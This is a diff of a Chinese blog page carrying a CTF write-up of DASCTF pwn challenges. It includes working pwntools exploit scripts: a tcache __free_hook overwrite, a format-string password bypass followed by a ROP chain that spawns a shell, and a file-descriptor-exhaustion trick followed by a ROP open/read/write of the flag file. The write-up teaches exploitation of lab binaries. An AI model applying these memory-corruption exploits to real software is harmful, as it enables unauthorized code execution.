class="line"><span class="number">0x5555555600d0</span>:	<span class="number">0x00007fff00657375</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x5555555600e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555600f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x555555560100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000555555560040</span></span><br><span class="line"><span class="number">0x555555560110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555560120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555560130</span>:	<span class="number">0x0000555555560180</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x555555560140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555560150</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555560160</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555560170</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555560180</span>:	<span class="number">0x0000000000000140</span>	<span class="number">0x0000000000000500</span></span><br><span class="line"><span class="number">0x555555560190</span>:	<span class="number">0x000000656772656d</span>	<span class="number">0x00007ffff7fc91c0</span></span><br><span class="line"><span class="number">0x5555555601a0</span>:	<span class="number">0x0000555555560180</span>	<span class="number">0x0000555555560180</span></span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">最后使用tcache分配__free_hook为system</span><br><span class="line">-------------------------</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">io.recv()</span><br><span class="line">leak =  u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(<span class="string">"leak:"</span>,hex(leak))</span><br><span class="line">base = leak-(<span class="number">0x7ffff7fc8ca0</span><span class="number">-0x7ffff7e26000</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">hook = libc.sym[<span class="string">'__free_hook'</span>]+base</span><br><span class="line">system = libc.sym[<span class="string">'system'</span>]+base</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">6</span>+p64(hook)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'/bin//sh\x00'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">dele(<span class="number">16</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h2><p>又是easy又是baby绝壁难做<br>放入ida后发现库函数不能识别了，发现原来plt的函数变成endbr64开头了。<br>无奈只能用gdb来调试……..<br>调试后发现程序的功能是输入一个用户名和密码其中用户名密码被限制了长度.</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/easybaby2-1.png" class="">
+
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/easybaby2-2.png" class="">
+<p>输入完后程序通过打开/dev/random生成一个随机数并使用mmap映射一块内存存放在将这块内存设置不能写入和执行。然后将密码和随机数比较，如果成功则可以让用户留言失败则exit。</p>
+<p><strong>发现两个漏洞</strong></p>
+<ul>
+<li>格式化字符串漏洞</li>
+</ul>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/easybaby1.png" class="">
+<ul>
+<li>栈溢出漏洞</li>
+</ul>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/easybaby3.png" class="">
+<p>由于栈溢出漏洞在密码验证的后面因为我们要绕过密码的检验才能达到。本菜鸡想了很多方法结果都没绕过（因为12字节限制）最后看大佬们的题解才知道格式化中”*”这个符号的存在—c语言白学系列<br>这个符号指定参数作为宽度或精度和n$使用则可以指定一个参数作为宽度，有了这个符号就能将随机数生成的密码作为参数然后使用%n将密码间接的写入保存密码的地址.<br>于是有了下面这个字符串用来作为参数</p>
+<blockquote>
+<p>%*18$d%5$n</p>
+</blockquote>
+<p>成功绕过验证后rop乱杀不过有个细节 system的got地址末尾有0x20会导致写入不完整因此只能使用plt来执行system<br><strong>解题思路</strong></p>
+<ul>
+<li>利用格式化字符串绕过验证</li>
+<li>使用栈溢出进行rop执行system<br>exp如下:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">'./easybabystack'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./easybabystack'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">raw_input()</span><br><span class="line">padding = <span class="number">0x118</span></span><br><span class="line">onegadget1 = <span class="number">0x40172A</span></span><br><span class="line">onegadget2 = <span class="number">0x401710</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">system_got = elf.got[<span class="string">'system'</span>]</span><br><span class="line">fini = <span class="number">0x401748</span></span><br><span class="line">rop = padding*<span class="string">'a'</span></span><br><span class="line">rop+=flat([onegadget1, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, elf.bss(<span class="number">0x600</span>), <span class="number">0x10</span>, read_got])</span><br><span class="line">rop += flat([onegadget2,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x401733</span>,elf.bss(<span class="number">0x600</span>),<span class="number">0x401110</span>])</span><br><span class="line"><span class="comment">#rop +=flat([onegadget2,0,0,0,elf.bss(0x600),0,0,elf.got['system'],onegadget2])</span></span><br><span class="line"><span class="comment">## then input bin/sh</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(user,pwd)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'username:'</span>,user)</span><br><span class="line">    io.sendlineafter(<span class="string">'passwd:'</span>,pwd)</span><br><span class="line">payload = (<span class="string">"%*18$d%5$n"</span>)</span><br><span class="line">input(payload,<span class="string">'123'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'message: '</span>,rop)</span><br><span class="line">io.send(<span class="string">"/bin//sh\n"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2>检查保护</li>
+</ul>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/secret1.png" class="">
+<p>拖进ida后经过分析得知这是一个猜数字的程序，这个程序在大循环内会打开/dev/urandom/读取随机数,只要猜对233次就能进入一个分支 如果9999次后没有成功会调用system。我傻傻的去写了脚本猜了9999次后发现system无法打开。原因是文件描述符被用完，想了很多办法都无法猜对数字然后比赛就结束了。</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/secret2.png" class="">
+<p>比赛后我看了大佬们做出来的exp焕然大悟，这题成也在文件描述符败也在文件描述符……..我怎么就没想到描述符用完后open就打不开/dev/urandom了呢….linux程序中描述符最多有1024个，减去0 1 2后有1021个由于每次置随机数时前会把变量置0，因此当描述符用完后就一直是0了……..所以只要在描述符用完后写入233个0就能进入分支了，进入分支后程序关闭了stdin这样就用不了system了。<br>进入分支后发现一个明显的栈溢出漏洞</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/secret3.png" class="">
+<p>使用rop+orw 不过过程还是碰到了一点麻烦咱们没有标准输入所以没有办法输入路劲，但是好在程序里已经有flag的字符串了…..<br><strong>解题思路</strong></p>
+<ul>
+<li>消耗1021个描述符后写入233个0进入分支</li>
+<li>使用栈移除打开读取flag然后输出<br>下面exp:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">io=process(<span class="string">'./secret2'</span>)</span><br><span class="line">raw_input()</span><br><span class="line"><span class="comment">#io=remote('183.129.189.60',10051)</span></span><br><span class="line">elf = ELF(<span class="string">"./secret2"</span>)</span><br><span class="line">write  = elf.got[<span class="string">'write'</span>] </span><br><span class="line">read = elf.got[<span class="string">'read'</span>]</span><br><span class="line">op = elf.got[<span class="string">'open'</span>]</span><br><span class="line">flag = <span class="number">0x4021DF</span></span><br><span class="line">bss = <span class="number">0x404000</span></span><br><span class="line">og1 =<span class="number">0x401612</span></span><br><span class="line">og2 = <span class="number">0x4015F8</span></span><br><span class="line">bs = <span class="number">0x4021E4</span></span><br><span class="line">pop_rdi=<span class="number">0x40161b</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x401619</span></span><br><span class="line"><span class="comment">#gadget_1=0x4015F8</span></span><br><span class="line"><span class="comment">#gadget_2=0x401612</span></span><br><span class="line"><span class="comment">#flag_addr=0x4021Df</span></span><br><span class="line">payload=<span class="string">'A'</span>*(<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=flat([og1,<span class="number">0</span>,<span class="number">1</span>,op,flag,<span class="number">1</span>,<span class="number">0</span>])</span><br><span class="line">payload+=flat([og2,<span class="number">0</span>])</span><br><span class="line">payload+=flat([<span class="number">0</span>,<span class="number">1</span>,read,<span class="number">0</span>,elf.bss()+<span class="number">0x50</span>,<span class="number">0x50</span>])</span><br><span class="line">payload+=flat([og2,<span class="number">0</span>])</span><br><span class="line">io.sendlineafter(<span class="string">"What's your name?"</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1023</span><span class="number">-3</span>+<span class="number">235</span>):</span><br><span class="line">    io.sendafter(<span class="string">"Secret:"</span>,p64(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/06/08/2020-6-8-java%E5%AE%9E%E8%AE%AD/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">java一次实训</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -213,8 +422,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
